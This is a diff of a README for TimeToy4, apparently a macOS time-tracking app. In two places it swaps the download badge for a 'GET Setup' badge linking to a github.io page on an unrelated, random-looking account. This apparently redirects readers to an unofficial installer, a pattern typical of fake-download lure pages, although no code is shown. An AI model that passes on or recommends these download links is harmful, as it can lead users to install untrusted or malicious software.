@@ -2,11 +2,7 @@
 
 ![TimeToy4 Screenshot](https://static.macupdate.com/screenshots/5634/m/timetoy4-screenshot.png?v=1568050568)
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/time">
-    <img src="https://img.shields.io/badge/⬇️_Download_TimeToy4-9b59b6?style=for-the-badge&logo=apple&logoColor=white" alt="Download TimeToy4 for macOS">
-  </a>
-</p>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://alfred4425jeannine.github.io/.github/TimeToy4)
 
 ---
 
@@ -104,11 +100,7 @@ Yes — you can organize sessions by categories or projects.
 
 ---
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/time">
-    <img src="https://img.shields.io/badge/⬇️_Download_TimeToy4-9b59b6?style=for-the-badge&logo=apple&logoColor=white" alt="Download TimeToy4 for macOS">
-  </a>
-</p>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://alfred4425jeannine.github.io/.github/TimeToy4)
 
 ## 🔖 Tags
 
